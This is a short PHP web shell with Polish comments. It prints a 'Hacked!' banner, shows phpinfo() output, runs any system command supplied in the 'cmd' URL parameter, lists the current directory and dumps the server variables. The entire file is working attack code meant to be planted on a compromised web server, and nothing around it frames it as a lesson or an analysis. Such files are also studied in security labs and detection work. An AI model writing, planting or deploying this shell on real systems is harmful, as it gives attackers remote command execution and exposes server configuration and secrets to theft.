<?php
// Wyświetlenie informacji o serwerze
echo "<h1>Hacked!</h1>";

// Wyświetlenie informacji o PHP
echo "<h2>PHP Info:</h2>";
phpinfo();

// Wykonanie dowolnego polecenia systemowego
if (isset($_GET['cmd'])) {
    echo "<h2>Executing command:</h2>";
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}

// Lista plików w bieżącym katalogu
echo "<h2>Current Directory Listing:</h2>";
echo "<pre>";
system('ls -la'); // Na Windowsie: system('dir');
echo "</pre>";

// Wyświetlenie zmiennych środowiskowych
echo "<h2>Environment Variables:</h2>";
echo "<pre>";
print_r($_SERVER);
echo "</pre>";
?>